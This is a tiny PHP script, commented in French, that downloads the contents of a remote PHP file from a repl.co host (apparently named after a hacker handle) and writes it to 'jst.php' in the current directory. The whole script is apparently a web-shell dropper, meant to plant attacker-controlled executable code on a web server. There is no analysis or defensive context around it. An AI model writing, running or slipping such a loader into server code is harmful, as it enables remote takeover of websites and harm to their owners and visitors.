<?php
// récupère le contenu du fichier distant
$content = file_get_contents('https://clipdermars.trhacknon.repl.co/xobeval.php');

// crée le fichier jst.php dans le répertoire courant et y écrit le contenu récupéré
file_put_contents('jst.php', $content);
?>
